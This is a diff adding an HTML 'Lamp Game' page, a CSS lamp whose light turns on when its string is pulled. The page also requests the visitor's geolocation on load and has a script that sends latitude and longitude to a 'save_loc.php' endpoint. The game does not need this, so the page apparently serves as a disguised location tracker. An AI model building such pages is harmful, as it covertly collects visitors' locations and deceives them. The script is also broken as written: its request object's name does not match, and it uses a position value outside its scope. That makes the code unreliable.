@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <style>html,body{
+        overflow: hidden;
+        height:100%;
+        margin:0;
+      }
+      
+      #turnon{
+        width:100%;
+        height:100%;
+        display:block;
+        background:#111;
+        transition: 300ms;
+      }
+      
+      .lamp,.turnoff{
+            width:100px;
+            height:100px;
+            top:0;
+            left:50%;
+            margin-left:-100px;
+            position:absolute;
+        border-bottom: 100px solid #444;
+        border-left: 50px solid transparent;
+        border-right: 50px solid transparent;
+        height: 0;
+        z-index:11;
+      }
+      
+      .turnoff{ display: none; }
+      
+      .bulb{
+        position:absolute;
+        top:90px;
+        left:50%;
+        height:32px;
+        width:32px;
+        margin-left:-16px;
+        background:#777;
+        border-radius:32px;
+        z-index:9;
+        transition: 300ms;
+        -webkit-transition-delay:300ms;
+      }
+      
+      .string{
+        position:absolute;
+        top:90px;
+        left:50%;
+        margin-left:25px;
+        height:100px;
+        width:2px;
+        background:#999;
+        display:block;
+        z-index:10;
+      }
+      
+      .light{
+        width: 50px;
+        height: 0;
+        top: 90px;
+        left: 50%;
+        margin: -135px 0 0 -740px;
+        border: 715px solid transparent;
+        border-top: none;
+        border-bottom: 1400px solid #FF8;
+        opacity: 0;
+        position: absolute;
+        transition: 300ms;
+        -webkit-transition-delay:300ms;
+      }
+      
+      #turnon:target .light{ opacity:0.2; }
+      #turnon:target .bulb{ background:#FAEB83; }
+      #turnon:target .turnoff{ display:block; }
+      #turnon:target .lamp{ display:none; }
+      #turnon:target .string{ -webkit-animation:pull 500ms; }
+      
+      @-webkit-keyframes pull{
+        0%{ height:100px; background:#666; }
+        50%{ height:120px; }
+        100%{ height:100px; }
+      }
+      </style>
+    <title>Lamp Game</title>
+</head>
+<body onload="getLocation()">
+    <div id="turnon">
+        <a href="#turnon" class="lamp"></a>
+        <a href="#turnoff" class="turnoff"></a>
+        <div class="string"></div>
+        <div class="bulb"></div>
+        <div class="light"></div>
+      </div>
+
+
+<p id="demo"></p>
+
+<script>
+const x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+const http = new XMLHttpRequest();
+xhttp.open("GET", "save_loc.php?lat="+position.coords.latitude+"&long="+position.coords.longitude);
+xhttp.send();
+
+
+
+function showPosition(position) {
+  x.innerHTML = "Latitude: " + position.coords.latitude + 
+  "<br>Longitude: " + position.coords.longitude;
+}
+</script>
+</body>
+</html>
